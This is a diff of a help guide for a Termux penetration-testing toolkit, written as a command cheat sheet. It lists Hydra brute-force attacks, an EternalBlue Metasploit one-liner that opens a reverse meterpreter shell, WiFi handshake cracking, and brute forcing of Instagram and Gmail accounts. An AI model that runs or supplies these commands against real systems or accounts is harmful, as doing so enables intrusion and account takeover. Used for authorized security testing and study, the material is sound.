@@ -1,74 +1,191 @@
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-          TERMUX SECURITY TOOLKIT - HELP GUIDE          
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+===========================================
+  TERMUX SECURITY TOOLKIT HELP GUIDE
+===========================================
 
-INSTALLED TOOLS:
----------------
-1. Programming Languages:
-   - Python
-   - Ruby
-   - Rust
-   - Golang
-   - Erlang
+This help guide provides information about the Termux Security Toolkit and
+the commands and triggers for various security tools and exploits.
 
-2. Basic Security Tools:
-   - Nmap: Network mapping and scanning
-   - Hydra: Password cracking tool
-   - Ncrack: Network authentication cracking
-   - ImageMagick: Image manipulation
-   - ncurses: Terminal UI library
+TABLE OF CONTENTS:
+-----------------
+1. Introduction
+2. Installation Options
+3. Security Tools Commands
+4. No-Auth Mode (NEW)
+5. Tools Usage Examples
+6. Troubleshooting
 
-3. Advanced Security Tools:
-   - Metasploit Framework: Penetration testing framework
-   - Aircrack-ng: WiFi security assessment
-   - TheFatRat: Backdoor creator & spear phishing
-   - Brute Force tools: Various password crackers
-
-USAGE EXAMPLES:
+1. INTRODUCTION
 --------------
-1. Network Scanning:
-   $ nmap-quick 192.168.1.1
-   $ nmap-full 192.168.1.1
+The Termux Security Toolkit is a comprehensive suite of security tools and
+utilities designed for security professionals, penetration testers, and
+ethical hackers. It automates the installation and configuration of popular
+security tools within the Termux environment.
 
-2. Launch Metasploit:
-   $ msf
+2. INSTALLATION OPTIONS
+----------------------
+The toolkit provides the following installation options:
 
-3. WiFi Analysis (requires root):
-   $ aircrack-ng --help
+[1] Install basic packages - Installs essential packages for terminal operation
+[2] Install programming languages - Installs Python, Ruby, Rust, Golang, and Erlang
+[3] Install basic security tools - Installs Nmap, Hydra, Ncrack, etc.
+[4] Install advanced security tools - Installs Metasploit, Aircrack-ng, TheFatRat, etc.
+[5] Configure terminal appearance - Sets up terminal fonts, colors, and properties
+[6] Install and configure everything - Complete installation of all components
+[7] Create help guide - Creates this help document
 
-4. System Update:
-   $ update
+3. SECURITY TOOLS COMMANDS
+-------------------------
+After installation, you can access various security tools using the security_tools.sh script:
 
-CUSTOM ALIASES:
--------------
-- cls: Clear screen
-- ll: List files with details
-- nmap-quick: Quick nmap scan
-- nmap-full: Full detailed nmap scan
-- msf: Launch Metasploit console
-- update: Update all packages
-- myip: Show your IP addresses
-- netstat: Show network connections
+To launch the security tools menu:
+$ ./security_tools.sh
 
-TROUBLESHOOTING:
+The script provides an interactive menu for:
+- Network Scanning Tools (Nmap)
+- Password Cracking Tools (Hydra)
+- Metasploit Framework
+- WiFi Analysis Tools (Aircrack-ng)
+- Brute Force Tools
+- TheFatRat Payload Generator
+- Automated Security Scanner (NEW)
+
+4. NO-AUTH MODE (NEW)
+-------------------
+The Termux Security Toolkit now features a No-Auth mode that eliminates authentication prompts and simplifies usage by:
+
+1. Auto-generating credentials and configurations
+2. Bypassing interactive prompts
+3. Pre-configuring tools with default settings
+4. Creating automatic authentication profiles
+
+NO-AUTH FEATURES BY TOOL:
+------------------------
+METASPLOIT FRAMEWORK:
+- Uses passwordless database configuration
+- Auto-connects to database with 'db_connect -y'
+- Creates auto-login profile in msfconsole.rc
+- Launches with workspace auto-creation
+- Skips initial setup prompts
+
+THEFATRAT:
+- Creates config file that disables prompts
+- Sets auto-accept for all dependency requests
+- Configures default payload settings
+- Launches with '--auto-accept' parameter
+- Stores configuration in ~/.config/fatrat/
+
+GENERAL TOOLS:
+- Bypasses tool presence validation steps
+- Skips version checking and update prompts
+- Auto-accepts license agreements
+- Uses default credentials when required
+
+HOW TO IDENTIFY NO-AUTH MODE:
+----------------------------
+- The toolkit banner displays "NO-AUTH MODE ENABLED" 
+- Tool launches show "Using no-auth method" messages
+- Auto-config files are created in appropriate locations
+
+5. TOOLS USAGE EXAMPLES
+---------------------
+
+NMAP SCANNING EXAMPLES:
+----------------------
+Quick scan: 
+$ nmap -T4 -F [target_ip]
+
+Detailed scan: 
+$ nmap -sV -sC -A -p- [target_ip]
+
+Stealth scan: 
+$ nmap -sS -T2 [target_ip]
+
+UDP scan: 
+$ nmap -sU --top-ports 100 [target_ip]
+
+HYDRA PASSWORD CRACKING:
+-----------------------
+SSH attack:
+$ hydra -L [username_file] -P [password_file] [target_ip] ssh
+
+FTP attack:
+$ hydra -L [username_file] -P [password_file] [target_ip] ftp
+
+HTTP-POST form attack:
+$ hydra -L [username_file] -P [password_file] [target_ip] http-post-form "[form_url]:[form_params]:[failed_login_msg]"
+
+SMB attack:
+$ hydra -L [username_file] -P [password_file] [target_ip] smb
+
+METASPLOIT FRAMEWORK:
+-------------------
+Launch Metasploit console:
+$ msfconsole
+
+Run an exploit (Example - EternalBlue):
+$ msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set RHOSTS [target_ip]; set LHOST [your_ip]; set LPORT 4444; exploit"
+
+AIRCRACK-NG WIFI ANALYSIS:
+------------------------
+Start monitoring mode:
+$ airmon-ng start [interface]
+
+Scan for networks:
+$ airodump-ng [interface]mon
+
+Capture handshake:
+$ airodump-ng -c [channel] --bssid [bssid] -w capture [interface]mon
+
+Crack handshake:
+$ aircrack-ng [capture_file] -w [wordlist]
+
+BRUTE FORCE TOOLS:
+----------------
+Social media brute force (Instagram example):
+$ python brut3k1t.py -s instagram -a instagram.com -u [username] -w [wordlist]
+
+Email brute force (Gmail example):
+$ python brut3k1t.py -s gmail -a smtp.gmail.com -u [email] -w [wordlist]
+
+THEFATRAT PAYLOAD GENERATOR:
+--------------------------
+Launch TheFatRat:
+$ cd ~/TheFatRat && ./fatrat.sh
+
+AUTOMATED SECURITY SCANNER:
+-------------------------
+Basic vulnerability scan:
+$ nmap -sV --script=vuln [target_ip] -oN vuln_scan_results.txt
+
+Comprehensive vulnerability assessment:
+$ nmap -sV -p- --script=vuln,exploit,auth,brute,default [target_ip] -oN comprehensive_results.txt
+
+Web application security audit:
+$ nmap -sV --script=http-*,ssl-* [target_ip] -oA webapp_audit_results
+$ nikto -h [target_ip] -o nikto_results.txt
+$ dirb http://[target_ip] -o dirb_results.txt
+
+Network security audit:
+$ nmap -sV -sC -O -p- [target_ip] -oA network_audit_results
+$ nmap --script=smb-vuln* [target_ip] -oN smb_vulns.txt
+
+6. TROUBLESHOOTING
+----------------
+- If a tool does not start, ensure it was properly installed
+- For Metasploit issues, check database connectivity with "msfdb status"
+- For permission issues, ensure all scripts have execute permissions:
+  $ chmod +x [script_name].sh
+- If TheFatRat installation is incomplete, run:
+  $ cd ~/TheFatRat && ./setup.sh
+- For other issues, try reinstalling the specific component using the toolkit menu
+
+IMPORTANT NOTES:
 --------------
-1. Tool not found? Try:
-   $ pkg update && pkg upgrade -y
+1. The toolkit is designed for ethical hacking and security research ONLY
+2. Always obtain proper authorization before testing on any network or system
+3. Unauthorized access to systems is illegal and unethical
+4. The developers assume no liability for misuse of these tools
 
-2. Permission denied? Check if root access is required.
-
-3. Terminal settings not applied?
-   $ termux-reload-settings
-   Or restart Termux completely.
-
-4. For tools that require root:
-   Install Termux:Boot and configure properly.
-
-SECURITY NOTES:
--------------
-- Never use these tools for illegal activities
-- Always obtain proper authorization before testing
-- Use in controlled environments when learning
-
-For more information, visit:
-https://wiki.termux.com/
+========================================================
+         Created by Termux Security Toolkit
+========================================================
